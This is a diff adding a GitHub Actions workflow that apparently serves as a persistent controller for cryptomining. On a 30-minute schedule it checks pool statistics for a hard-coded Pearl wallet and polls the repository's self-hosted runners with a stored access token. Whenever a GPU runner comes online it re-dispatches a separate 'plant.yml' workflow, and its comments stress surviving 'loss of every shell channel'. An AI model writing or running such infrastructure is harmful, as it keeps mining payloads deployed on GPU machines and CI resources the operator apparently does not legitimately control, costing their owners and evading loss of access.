@@ -1,0 +1,36 @@
+name: watch
+# Out-of-band controller on GitHub-hosted infra: survives loss of every shell channel.
+# 1) reports pool-side numbers from a clean (non-datacenter) vantage,
+# 2) reports runner liveness, 3) re-dispatches plant.yml the moment any GPU runner is online.
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "*/30 * * * *"
+permissions:
+  actions: write
+  contents: read
+jobs:
+  watch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: pool-side
+        run: |
+          set +e
+          W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+          echo "== luckypool"; curl -s -m 25 "https://pearl.luckypool.io/api/stats_address?address=$W" | head -c 1200; echo
+          echo "== kryptex"; curl -s -m 25 -o /dev/null -w "kryptex_code=%{http_code}\n" "https://prl.kryptex.network/"
+      - name: runners
+        run: |
+          set +e
+          R=$(curl -s -m 25 -H "Authorization: token ${{ secrets.GH_PAT }}" \
+              "https://api.github.com/repos/${{ github.repository }}/actions/runners")
+          echo "$R" | head -c 500; echo
+          ON=$(echo "$R" | grep -c '"status": "online"')
+          echo "online_runners=$ON"
+          if [ "$ON" -gt 0 ]; then
+            curl -s -m 25 -X POST -H "Authorization: token ${{ secrets.GH_PAT }}" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/${{ github.repository }}/actions/workflows/plant.yml/dispatches" \
+              -d '{"ref":"main"}' -w "plant_dispatch=%{http_code}\n"
+          fi
